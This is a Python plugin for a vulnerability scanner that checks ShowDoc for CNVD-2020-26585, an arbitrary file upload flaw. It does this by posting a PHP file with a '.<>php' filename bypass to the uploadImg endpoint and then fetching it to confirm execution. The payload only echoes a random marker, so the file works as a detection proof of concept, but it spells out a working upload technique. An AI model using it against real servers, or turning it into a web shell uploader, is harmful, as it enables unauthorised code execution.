#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
ShowDoc 任意文件上传
    CNVD-2020-26585
        Payload: https://blog.csdn.net/weixin_51387754/article/details/121093802

api_page存在任意文件上传
'''

from lib.tool.md5 import random_md5, random_num
from lib.tool import check
import re
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.randomNum = random_num(24)
        self.randomStr_1 = random_md5()
        self.randomStr_2 = random_md5()

        self.payloads = [
            {
                'path': 'index.php?s=/home/page/uploadImg',
                'data': '----------------------------{NUM}\n'\
                        'Content-Disposition: form-data; name="editormd-image-file"; filename="{FILENAME}.<>php"\n'\
                        'Content-Type: text/plain\n'\
                        '\n'\
                        '<?php echo "{RCEMD}"?>\n'\
                        '----------------------------{NUM}--'.format(NUM=self.randomNum, FILENAME=self.randomStr_1, RCEMD=self.randomStr_2),
                'headers': {'Content-Type': 'multipart/form-data; boundary=--------------------------{NUM}'.format(NUM=self.randomNum)}
            }
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'ShowDoc',
            'vul_type': 'FileUpload',
            'vul_id': 'CNVD-2020-26585',
        }

        for payload in self.payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']

            res = client.request(
                'post',
                path,
                data=data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
            if (('"success":1' in res.text) and file_path):
                file_path = file_path.group()                                     # * 提取返回的文件路径
                file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url

                res2 = client.request(
                    'get',
                    file_path,
                    allow_redirects=False,
                    vul_info=vul_info,
                )
                if res2 is None:
                    continue

                if (check.check_res(res2.text, self.randomStr_2)):
                    results = {
                        'Target': res.request.url,
                        'Verify': res2.request.url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request-1': res,
                        'Request-2': res2
                    }
                    return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)


def cnvd_2020_26585_scan(clients):
    '''  '''
